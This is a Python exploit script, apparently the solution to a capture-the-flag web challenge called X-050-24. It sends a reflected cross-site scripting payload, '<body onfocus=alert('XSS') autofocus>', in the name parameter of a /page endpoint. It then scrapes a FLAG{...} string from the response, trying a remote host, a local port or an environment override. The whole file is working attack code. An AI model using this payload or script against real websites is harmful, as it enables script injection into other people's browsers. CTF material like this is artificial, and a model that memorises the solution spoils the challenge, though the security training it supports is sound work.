#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
X-050-24 exploit: trigger XSS via the name parameter and print the flag.

Vector matches the observed working payload:
  <body onfocus=alert('XSS') autofocus>

It requests /page?name=..., then extracts and prints FLAG{...} from HTML.
"""
import sys
import re
import argparse


def build_url(base, path):
    base = base.rstrip('/')
    if not path.startswith('/'):
        path = '/' + path
    return base + path


def http_get(url, params):
    # Prefer requests if available; fallback to urllib
    try:
        import requests  # type: ignore
        resp = requests.get(url, params=params, headers={
            "User-Agent": "Mozilla/5.0 (X-050-24-EXP)"
        }, timeout=10)
        resp.raise_for_status()
        return resp.text
    except Exception:
        # Fallback using stdlib
        from urllib.parse import urlencode
        from urllib.request import urlopen, Request
        qs = urlencode(params)
        sep = '&' if ('?' in url) else '?'
        full = url + sep + qs
        req = Request(full, headers={"User-Agent": "Mozilla/5.0 (X-050-24-EXP)"})
        with urlopen(req, timeout=10) as r:  # nosec - controlled by user
            return r.read().decode('utf-8', errors='replace')


def extract_flag(html):
    m = re.search(r'FLAG\{[^}]+\}', html)
    return m.group(0) if m else None


def try_exploit(base):
    url = build_url(base, '/page')
    payload = "<body onfocus=alert('XSS') autofocus>"
    html = http_get(url, params={'name': payload})
    return extract_flag(html)


def main():
    ap = argparse.ArgumentParser(description='X-050-24: print flag')
    ap.add_argument('--base', help='Base URL (default: remote then local)')
    args = ap.parse_args()

    candidates = []
    if args.base:
        candidates.append(args.base)
    else:
        # Allow env override
        try:
            import os
            env_base = os.environ.get('TARGET_BASE')
            if env_base:
                candidates.append(env_base)
        except Exception:
            pass
        # Remote observed port, then local
        candidates.append('http://ip32813')
        candidates.append('http://127.0.0.1:5000')

    for base in candidates:
        try:
            flag = try_exploit(base)
        except Exception:
            continue
        if flag:
            print(flag)
            return 0

    print('No flag found', file=sys.stderr)
    return 1


if __name__ == '__main__':
    sys.exit(main())

